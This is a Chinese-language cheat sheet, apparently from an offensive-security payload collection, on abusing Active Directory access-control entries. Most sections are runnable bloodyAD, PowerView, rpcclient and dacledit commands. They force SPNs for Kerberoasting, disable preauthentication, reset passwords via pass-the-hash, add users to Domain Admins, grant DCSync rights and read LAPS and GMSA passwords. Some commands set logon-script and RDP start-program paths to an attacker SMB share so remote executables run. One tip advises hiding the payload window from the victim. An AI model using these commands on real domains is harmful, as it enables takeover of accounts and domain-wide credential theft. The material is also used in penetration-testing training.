# Active Directory - 访问控制 ACL/ACE

**访问控制条目（ACE）** 是授予或拒绝用户或组对特定资源（如文件或目录）的具体权限。每个 ACE 定义了允许（如读取、写入、执行）或拒绝的访问类型。

**访问控制列表（ACL）** 是与资源关联的访问控制条目（ACE）的集合。

* 使用 [ADACLScanner](https://github.com/canix1/ADACLScanner) 检查用户的 ACL。

 ```ps1
 ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
 ```

* 使用 [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) 自动利用 ACL：

 ```ps1
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
 ```

## GenericAll/GenericWrite

### 用户/计算机

我们可以在目标帐户上设置 **SPN**，请求服务票据（ST），然后获取其哈希并进行 Kerberoast。

* Windows/Linux

  ```ps1
  # 检查帐户上的有趣权限：
  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'

  # 检查当前用户是否已设置 SPN：
  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object <UserName> --attr serviceprincipalname

  # 强制在帐户上设置 SPN：定向 Kerberoasting
  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'

  # 获取票据
  GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>

  # 移除 SPN
  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname
  ```

* 仅 Windows

  ```ps1
  # 检查帐户上的有趣权限：
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

  # 检查当前用户是否已设置 SPN：
  PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname

  # 强制在帐户上设置 SPN：定向 Kerberoasting
  PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}

  # 获取票据
  PowerView2 > $User = Get-DomainUser username 
  PowerView2 > $User | Get-DomainSPNTicket | fl
  PowerView2 > $User | Select serviceprincipalname

  # 移除 SPN
  PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
  ```

我们可以更改受害者的 **userAccountControl** 使其不需要 Kerberos 预身份验证，获取用户可破解的 AS-REP，然后恢复设置。

* Windows/Linux：

  ```ps1
  # 修改 userAccountControl
  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH

  # 获取票据
  $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

  # 恢复 userAccountControl
  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
  ```

* 仅 Windows：

  ```ps1
  # 修改 userAccountControl
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose

  # 获取票据
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username

  # 恢复 userAccountControl
  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
  ```

重置其他用户的密码。

* Windows/Linux：

  ```ps1
  # 使用 bloodyAD 进行哈希传递
  bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'
  ```

* 仅 Windows：

  ```ps1
  # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
  $user = 'DOMAIN\user1'; 
  $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
  $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
  $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
  Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
  ```

* 仅 Linux：

  ```ps1
  # 使用 Samba 软件套件中的 rpcclient
  rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
  ```

对 ObjectType 的 WriteProperty，在此特殊情况下为 Script-Path，允许攻击者覆写委派用户的登录脚本路径，这意味着当委派用户下次登录时，其系统将执行我们的恶意脚本：

* Windows/Linux：

  ```ps1
  bloodyAD --host 10.0.0.5 -d example.lab -u attacker -p 'Password123*' set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
  ```

* 仅 Windows：

  ```ps1
  Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
  ```

### 组

此 ACE 允许我们将自己添加到域管理员组：

* Windows/Linux：

  ```ps1
  bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker
  ```

* 仅 Windows：

  ```ps1
  net group "domain admins" hacker /add /domain
  ```

* 仅 Linux：

  ```ps1
  # 使用 Samba 软件套件
  net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
  ```

### GenericWrite 与远程连接管理器

> 假设你所在的 Active Directory 环境仍在使用启用了 RCM 的 Windows Server 版本，或者你能够在已攻陷的 RDSH 上启用 RCM，这时可以做什么？Active Directory 中的每个用户对象都有一个"环境"选项卡。
>
> 此选项卡包含的设置可用于更改用户通过远程桌面协议（RDP）连接到 TS/RDSH 时启动的程序，取代常规的图形环境。"启动程序"字段中的设置基本上像 Windows 快捷方式一样工作，允许你提供本地或远程（UNC）路径指向要在连接到远程主机时启动的可执行文件。在登录过程中，RCM 进程会查询这些值并运行定义的可执行文件。 - "ACE to RCE" - @JustinPerdok - July 24, 2020

:warning: RCM 仅在终端服务器/远程桌面会话主机上活跃。RCM 在较新版本的 Windows（>2016）上已被禁用，需要更改注册表才能重新启用。

* Windows/Linux：

 ```ps1
 bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
 bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory -v 'C:\'
 ```

* 仅 Windows：

 ```ps1
 $UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
 $UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
 $UserObject.TerminalServicesWorkDirectory = "C:\"
 $UserObject.SetInfo()
 ```

注意：为了不惊动用户，payload 应隐藏自身进程窗口并启动正常的图形环境。

## WriteDACL

要滥用对域对象的 `WriteDacl` 权限，你可以授予自己 DCSync 权限。通过应用以下扩展权限 `Replicating Directory Changes/Replicating Directory Changes All`，可以将任何指定帐户添加为域的复制伙伴。

### 对域的 WriteDACL

* Windows/Linux：

  ```ps1
  # 授予主体 DCSync 权限
  bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2
  
  # DCSync 后移除权限
  bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2
  ```

* 仅 Windows：

  ```ps1
  # 授予主体 DCSync 权限
  Import-Module .\PowerView.ps1
  $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
  ```
  
### 对组的 WriteDACL

* Windows/Linux：

  ```ps1
  bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
  
  # 移除权限
  bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1
  ```

* 仅 Windows：

  ```ps1
  # 使用原生命令
  net group "INTERESTING_GROUP" User1 /add /domain
  # 或使用外部工具
  PowerSploit> Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
  ```

## WriteOwner

攻击者可以更改目标对象的所有者。一旦对象所有者被更改为攻击者控制的主体，攻击者就可以随意操纵该对象。

* Windows/Linux：

 ```ps1
 bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' set owner target_object devil_user1
 ```

* 仅 Windows：

 ```ps1
 Powerview> Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
 ```

此 ACE 可被滥用于即时计划任务攻击，或将用户添加到本地管理员组。

## ReadLAPSPassword

攻击者可以读取此 ACE 所适用的计算机帐户的 LAPS 密码。

* Windows/Linux：

 ```ps1
 bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```

* 仅 Windows：

 ```ps1
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
 ```

## ReadGMSAPassword

攻击者可以读取此 ACE 所适用帐户的 GMSA 密码。

* Windows/Linux：

 ```ps1
 bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword
 ```

* 仅 Windows：

 ```ps1
 # 将 blob 保存到变量
 $gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'

 # 使用 DSInternals 模块解码数据结构
 ConvertFrom-ADManagedPasswordBlob $mp
 ```

## ForceChangePassword

攻击者可以更改此 ACE 所适用用户的密码：

* Windows/Linux：

 ```ps1
 # 使用 bloodyAD 进行哈希传递
 bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password target_user target_newpwd
 ```

* Windows：

 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```

* Linux：

 ```ps1
 # 使用 Samba 软件套件中的 rpcclient
 rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
 ```

## 组织单位 ACL

授予组织单位的访问权限可被利用来攻陷其中包含的所有对象。

* [synacktiv/OUned](https://github.com/synacktiv/OUned) - OUned 项目通过 gPLink 投毒自动化利用 Active Directory 组织单位 ACL

### 非特权对象

拥有 OU 的 `GenericAll` 权限（因此也拥有 `WriteDACL` 权限）的用户可以向 OU 添加 `FullControl` ACE 并指定该 ACE 应被继承，这将有效地导致所有子对象被攻陷，因为它们将继承此 ACE。

* 在 **SERVERS** OU 上授予 `Full Control`

 ```ps1
 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'username' -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
 ```

* 验证我们在 **SERVERS** 中的 **AD01-SRV1** 上拥有 `Full Control` ACL

 ```ps1
 dacledit.py -action 'read' -principal 'username' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
 ```

:warning: 对于 `adminCount=1` 的对象，来自父对象的 ACE 继承是禁用的

### 特权对象

**前提条件**：

* `GenericWrite` 或 `Manage Group Policy` 链接权限
* 创建机器帐户
* 添加新的 DNS 记录

**攻击流程**：gPLink -> 攻击者 GPC FQDN -> 攻击者 SMB 共享中的 GPT 配置文件 -> 执行恶意计划任务

* 编辑 `gPLink` 值使其包含指向攻击者机器的 GPC FQDN
* 创建一个模仿真实服务器的伪 LDAP 服务器，但使用自定义 GPC
* GPC 的 gPCFileSysPath 值指向攻击者的 SMB 共享
* SMB 共享提供包含恶意计划任务的 GPT 配置文件

**利用方法**：

查看 [Synacktiv 的这篇博文](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) 以正确设置此攻击成功所需的所有条件。

```ps1
sudo python3 OUned.py --config config.ini
sudo python3 OUned.py --config config.example.ini --just-coerce
```

## 参考资料

* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
* [OU having a laugh? - Petros Koutroumpis - 6 November, 2019](https://labs.withsecure.com/publications/ou-having-a-laugh)
* [OUNED.PY: EXPLOITING HIDDEN ORGANIZATIONAL UNITS ACL ATTACK VECTORS IN ACTIVE DIRECTORY - Quentin Roland - 19/04/2024](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
